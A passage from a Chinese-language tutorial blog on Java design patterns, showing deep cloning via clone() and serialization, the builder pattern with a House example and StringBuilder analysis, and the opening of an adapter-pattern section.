class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.deepclone;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepProtoType</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, Cloneable&#123;<br>   <br>   <span class="hljs-keyword">public</span> String name; <span class="hljs-comment">//String 属性</span><br>   <span class="hljs-keyword">public</span> DeepCloneableTarget deepCloneableTarget;<span class="hljs-comment">// 引用类型</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeepProtoType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>   &#125;<br><br><br><br>   <span class="hljs-comment">//深拷贝 - 方式 1 使用clone 方法</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException &#123;<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">deep</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-comment">//这里完成对基本数据类型(属性)和String的克隆</span><br>      deep = <span class="hljs-built_in">super</span>.clone();<br>      <span class="hljs-comment">//对引用类型的属性，进行单独处理</span><br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">deepProtoType</span> <span class="hljs-operator">=</span> (DeepProtoType)deep;<br>      deepProtoType.deepCloneableTarget  = (DeepCloneableTarget)deepCloneableTarget.clone();<br><br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> deepProtoType;<br>   &#125;<br>   <br>   <span class="hljs-comment">//深拷贝 - 方式2 通过对象的序列化实现 (推荐)</span><br>   <br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">deepClone</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//创建流对象</span><br>      <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <br>      <span class="hljs-keyword">try</span> &#123;<br>         <br>         <span class="hljs-comment">//序列化</span><br>         bos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>         oos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>         oos.writeObject(<span class="hljs-built_in">this</span>); <span class="hljs-comment">//当前这个对象以对象流的方式输出</span><br>         <br>         <span class="hljs-comment">//反序列化</span><br>         bis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bos.toByteArray());<br>         ois = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>         <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">copyObj</span> <span class="hljs-operator">=</span> (DeepProtoType)ois.readObject();<br>         <br>         <span class="hljs-keyword">return</span> copyObj;<br>         <br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>         <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> handle exception</span><br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>      &#125; <span class="hljs-keyword">finally</span> &#123;<br>         <span class="hljs-comment">//关闭流</span><br>         <span class="hljs-keyword">try</span> &#123;<br>            bos.close();<br>            oos.close();<br>            bis.close();<br>            ois.close();<br>         &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> handle exception</span><br>            System.out.println(e2.getMessage());<br>         &#125;<br>      &#125;<br>      <br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.deepclone;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepProtoType</span>();<br>      p.name = <span class="hljs-string">&quot;宋江&quot;</span>;<br>      p.deepCloneableTarget = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepCloneableTarget</span>(<span class="hljs-string">&quot;大牛&quot;</span>, <span class="hljs-string">&quot;小牛&quot;</span>);<br>      <br><span class="hljs-comment">//    方式1 完成深拷贝</span><br>      <br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (DeepProtoType) p.clone();<br><br>      System.out.println(<span class="hljs-string">&quot;p.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p.deepCloneableTarget=&quot;</span> + p.deepCloneableTarget.hashCode());<br>      System.out.println(<span class="hljs-string">&quot;p2.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p2.deepCloneableTarget=&quot;</span> + p1.deepCloneableTarget.hashCode());<br>   <br>      <span class="hljs-comment">//方式2 完成深拷贝</span><br>      <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (DeepProtoType) p.deepClone();<br>      <br>      System.out.println(<span class="hljs-string">&quot;p.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p.deepCloneableTarget=&quot;</span> + p.deepCloneableTarget.hashCode());<br>      System.out.println(<span class="hljs-string">&quot;p2.name=&quot;</span> + p.name + <span class="hljs-string">&quot;p2.deepCloneableTarget=&quot;</span> + p2.deepCloneableTarget.hashCode());<br>   <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>p.name=宋江p.deepCloneableTarget=1360875712<br />p2.name=宋江p2.deepCloneableTarget=1625635731<br />p.name=宋江p.deepCloneableTarget=1360875712<br />p2.name=宋江p2.deepCloneableTarget=824909230</p><p>注释<code>DeepProtoType</code>中的一下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//对引用类型的属性，进行单独处理</span><br>     <span class="hljs-type">DeepProtoType</span> <span class="hljs-variable">deepProtoType</span> <span class="hljs-operator">=</span> (DeepProtoType)deep;<br>     deepProtoType.deepCloneableTarget  = (DeepCloneableTarget)deepCloneableTarget.clone();<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>p.name=宋江p.deepCloneableTarget=1360875712<br />p2.name=宋江p2.deepCloneableTarget=1360875712<br />p.name=宋江p.deepCloneableTarget=1360875712<br />p2.name=宋江p2.deepCloneableTarget=664223387</p><h1 id="建造者模式"><a class="markdownIt-Anchor" href="#建造者模式"></a> <mark>建造者模式</mark></h1><p>建造者模式（BuilderPattern）使用多个简单的对象一步一步构建成一个复杂的对象。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p><p>建造者模式（<strong>Builder Pattern</strong>） 又叫<strong>生成器模式</strong>，是一种对象<strong>构建模式</strong>。它可以将复杂对象的建造过程抽象出来（抽象类别），使这个抽象过程的不同实现方法可以构造出不同表现（属性）的对象。</p><p>建造者模式 是一步一步创建一个复杂的对象，它允许用户只通过指定复杂对象的类型和内容就可以构建它们，用户不需要知道内部的具体构建细节。</p><p>一个 Builder 类会一步一步构造最终的对象。该 Builder 类是独立于其他对象的。</p><h2 id="介绍-4"><a class="markdownIt-Anchor" href="#介绍-4"></a> 介绍</h2><p><strong>意图：</strong> 将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。</p><p><strong>主要解决：</strong><br />主要解决在软件系统中，有时候面临着&quot;一个复杂对象&quot;的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法却相对稳定。</p><p><strong>何时使用：</strong> 一些基本部件不会变，而其组合经常变化的时候。</p><p><strong>如何解决：</strong> 将变与不变分离开。</p><p><strong>关键代码：</strong> 建造者：创建和提供实例，导演：管理建造出来的实例的依赖关系。</p><p><strong>应用实例：</strong> 1、去肯德基，汉堡、可乐、薯条、炸鸡翅等是不变的，而其组合是经常变化的，生成出所谓的&quot;套餐&quot;。 2、JAVA 中的StringBuilder。</p><p><strong>优点：</strong> 1、建造者独立，易扩展。 2、便于控制细节风险。</p><p><strong>缺点：</strong> 1、产品必须有共同点，范围有限制。 2、如内部变化复杂，会有很多的建造类。</p><p><strong>使用场景：</strong> 1、需要生成的对象具有复杂的内部结构。 2、需要生成的对象内部属性本身相互依赖。</p><p><strong>注意事项：</strong> 与工厂模式的区别是：建造者模式更加关注与零件装配的顺序。</p><p><strong>建造者模式的四个角色：</strong></p><p>1、Product（产品角色）： 一个具体的产品对象。</p><p>2、 Builder（抽象建造者）： 创建一个 Product 对象的各个部件指定的 <strong>接口/抽象类</strong>。</p><p>3、ConcreteBuilder（具体建造者）： 实现接口，构建和装配各个部件。</p><p>4、Director（指挥者）： 构建一个使用 Builder 接口的对象。它主要是用于创建一个复杂的对象。它主要有两个作用，一是：隔离了客户与对象的生产过程，二是：负责控制产品对象的生产过程。</p><p><strong>建造者模式原理类图：</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224193125327.png" alt="image-20221224193125327" /></p><ol><li>需要建房子：这一过程为打桩、砌墙、封顶。不管是普通房子也好，别墅也好都需要经历这些过程，下面我们</li></ol><p>使用建造者模式(Builder Pattern)来完成</p><ol start="2"><li>思路分析图解(类图)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224213529759.png" alt="image-20221224213529759" /></p><h2 id="实现-3"><a class="markdownIt-Anchor" href="#实现-3"></a> 实现</h2><p><code>House</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-comment">//产品-&gt;Product</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">House</span> &#123;<br>   <span class="hljs-keyword">private</span> String baise;<br>   <span class="hljs-keyword">private</span> String wall;<br>   <span class="hljs-keyword">private</span> String roofed;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBaise</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> baise;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBaise</span><span class="hljs-params">(String baise)</span> &#123;<br>      <span class="hljs-built_in">this</span>.baise = baise;<br>   &#125;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getWall</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> wall;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWall</span><span class="hljs-params">(String wall)</span> &#123;<br>      <span class="hljs-built_in">this</span>.wall = wall;<br>   &#125;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRoofed</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> roofed;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRoofed</span><span class="hljs-params">(String roofed)</span> &#123;<br>      <span class="hljs-built_in">this</span>.roofed = roofed;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>HouseBuilder</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><br><span class="hljs-comment">// 抽象的建造者</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HouseBuilder</span> &#123;<br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-type">House</span> <span class="hljs-variable">house</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">House</span>();<br>   <br>   <span class="hljs-comment">//将建造的流程写好, 抽象的方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildBasic</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildWalls</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">roofed</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//建造房子好， 将产品(房子) 返回</span><br>   <span class="hljs-keyword">public</span> House <span class="hljs-title function_">buildHouse</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> house;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>CommonHouse</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonHouse</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HouseBuilder</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildBasic</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 普通房子打地基5米 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildWalls</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 普通房子砌墙10cm &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">roofed</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 普通房子屋顶 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>HighBuilding</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HighBuilding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HouseBuilder</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildBasic</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 高楼的打地基100米 &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildWalls</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 高楼的砌墙20cm &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">roofed</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 高楼的透明屋顶 &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>HouseDirector</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-comment">//指挥者，这里去指定制作流程，返回产品</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HouseDirector</span> &#123;<br>   <br>   <span class="hljs-type">HouseBuilder</span> <span class="hljs-variable">houseBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>   <span class="hljs-comment">//构造器传入 houseBuilder</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">HouseDirector</span><span class="hljs-params">(HouseBuilder houseBuilder)</span> &#123;<br>      <span class="hljs-built_in">this</span>.houseBuilder = houseBuilder;<br>   &#125;<br><br>   <span class="hljs-comment">//通过setter 传入 houseBuilder</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHouseBuilder</span><span class="hljs-params">(HouseBuilder houseBuilder)</span> &#123;<br>      <span class="hljs-built_in">this</span>.houseBuilder = houseBuilder;<br>   &#125;<br>   <br>   <span class="hljs-comment">//如何处理建造房子的流程，交给指挥者</span><br>   <span class="hljs-keyword">public</span> House <span class="hljs-title function_">constructHouse</span><span class="hljs-params">()</span> &#123;<br>      houseBuilder.buildBasic();<br>      houseBuilder.buildWalls();<br>      houseBuilder.roofed();<br>      <span class="hljs-keyword">return</span> houseBuilder.buildHouse();<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <br>      <span class="hljs-comment">//盖普通房子</span><br>      <span class="hljs-type">CommonHouse</span> <span class="hljs-variable">commonHouse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonHouse</span>();<br>      <span class="hljs-comment">//准备创建房子的指挥者</span><br>      <span class="hljs-type">HouseDirector</span> <span class="hljs-variable">houseDirector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HouseDirector</span>(commonHouse);<br>      <br>      <span class="hljs-comment">//完成盖房子，返回产品(普通房子)</span><br>      <span class="hljs-type">House</span> <span class="hljs-variable">house</span> <span class="hljs-operator">=</span> houseDirector.constructHouse();<br>      <br>      <span class="hljs-comment">//System.out.println(&quot;输出流程&quot;);</span><br>      <br>      System.out.println(<span class="hljs-string">&quot;--------------------------&quot;</span>);<br>      <span class="hljs-comment">//盖高楼</span><br>      <span class="hljs-type">HighBuilding</span> <span class="hljs-variable">highBuilding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighBuilding</span>();<br>      <span class="hljs-comment">//重置建造者</span><br>      houseDirector.setHouseBuilder(highBuilding);<br>      <span class="hljs-comment">//完成盖房子，返回产品(高楼)</span><br>      houseDirector.constructHouse();<br><br>         &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>普通房子打地基5米<br />普通房子砌墙10cm</p><p>普通房子屋顶</p><p>高楼的打地基100米<br />高楼的砌墙20cm<br />高楼的透明屋顶</p><h2 id="建造者模式在-jdk-的应用和源码分析"><a class="markdownIt-Anchor" href="#建造者模式在-jdk-的应用和源码分析"></a> 建造者模式在 JDK 的应用和源码分析</h2><ol><li><p>java.lang.StringBuilder 中的建造者模式</p></li><li><p>代码说明+Debug 源码</p></li></ol><ol><li><p>Appendable 接口定义了多个 append 方法(抽象方法), 即 Appendable 为抽象建造者, 定义了抽象方法</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224214505679.png" alt="image-20221224214505679" /></p></li><li><p>AbstractStringBuilder 实现了 Appendable 接口方法，这里的 AbstractStringBuilder</p><p>已经是建造者，只是不能实例化</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224220521554.png" alt="image-20221224220521554" /></p></li><li><p>StringBuilder 即充当了指挥者角色，同时充当了具体的建造者，建造方法的实现是由 AbstractStringBuilder 完成, 而 StringBuilder 继承了 AbstractStringBuilder</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224220732126.png" alt="image-20221224220732126" /></p></li></ol><h2 id="建造者模式的注意事项和细节"><a class="markdownIt-Anchor" href="#建造者模式的注意事项和细节"></a> 建造者模式的注意事项和细节</h2><ol><li><p>客户端(使用程序)不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象</p></li><li><p>每一个具体建造者都相对独立，而与其他的具体建造者无关，因此可以很方便地替换具体建造者或增加新的具体建造者， 用户使用不同的具体建造者即可得到不同的产品对象</p></li><li><p>可以更加精细地控制产品的创建过程 。将复杂产品的创建步骤分解在不同的方法中，使得创建过程更加清晰，也更方便使用程序来控制创建过程</p></li><li><p>增加新的具体建造者无须修改原有类库的代码，指挥者类针对抽象建造者类编程，系统扩展方便，符合“开闭原则”</p></li><li><p>建造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制。</p></li><li><p>如果产品的内部变化复杂，可能会导致需要定义很多具体建造者类来实现这种变化，导致系统变得很庞大，因此在这种情况下，要考虑是否选择建造者模式.</p></li><li><p>抽象工厂模式 VS 建造者模式</p><p>抽象工厂模式实现对产品家族的创建，一个产品家族是这样的一系列产品：具有不同分类维度的产品组合，采用抽象工厂模式不需要关心构建过程，只关心什么产品由什么工厂生产即可。而建造者模式则是要求按照指定的蓝图建造产品，它的主要目的是通过组装零配件而产生一个新产品</p></li></ol><h1 id="适配器模式"><a class="markdownIt-Anchor" href="#适配器模式"></a> <mark>适配器模式</mark></h1><p>适配器模式（Adapter Pattern）是作为两个不兼容的接口之间的桥梁。这种类型的设计模式属于结构型模式，它结合了两个独立接口的功能。</p><p>这种模式涉及到一个单一的类，该类负责加入独立的或不兼容的接口功能。举个真实的例子，读卡器是作为内存卡和笔记本之间的适配器。您将内存卡插入读卡器，再将读卡器插入笔记本，这样就可以通过笔记本来读取内存卡。</p><p>我们通过下面的实例来演示适配器模式的使用。其中，音频播放器设备只能播放 mp3 文件，通过使用一个更高级的音频播放器来播放 vlc 和 mp4 文件。</p><h2 id="介绍-5"><a class="markdownIt-Anchor" href="#介绍-5"></a> 介绍</h2><p><strong>意图：</strong> 将一个类的接口转换成客户希望的另外一个接口。适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。</p><p><strong>主要解决：</strong> 主要解决在软件系统中，常常要将一些&quot;现存的对象&quot;放到新的环境中，而新环境要求的接口是现对象不能满足的。</p><p><strong>何时使用：</strong></p><p>1、系统需要使用现有的类，而此类的接口不符合系统的需要。</p><p>2、想要建立一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作，这些源类不一定有一致的接口。</p><p>3、通过接口转换，将一个类插入另一个类系中。（比如老虎和飞禽，现在多了一个飞虎，在不增加实体的需求下，增加一个适配器，在里面包容一个虎对象，实现飞的接口。）</p><p><strong>如何解决：</strong> 继承或依赖（推荐）。</p><p><strong>关键代码：</strong> 适配器继承或依赖已有的对象，实现想要的目标接口。</p><p><strong>应用实例：</strong></p><p>1、美国电器 110V，中国 220V，就要有一个适配器将 110V 转化为 220V。</p><p>2、JAVA JDK 1.1 提供了Enumeration 接口，而在 1.2 中提供了 Iterator 接口，想要使用 1.2 的 JDK，则要将以前系统的 Enumeration接口转化为 Iterator 接口，这时就需要适配器模式。</p><p>3、在 LINUX 上运行 WINDOWS 程序。</p><p>4、JAVA 中的 jdbc。</p><p><strong>优点：</strong></p><p>1、可以让任何两个没有关联的类一起运行。</p><p>2、提高了类的复用。</p><p>3、增加了类的透明度。</p><p>4、灵活性好。</p><p><strong>缺点：</strong></p><p>1、过多地使用适配器，会让系统非常零乱，不易整体进行把握。比如，明明看到调用的是 A 接口，其实内部被适配成了 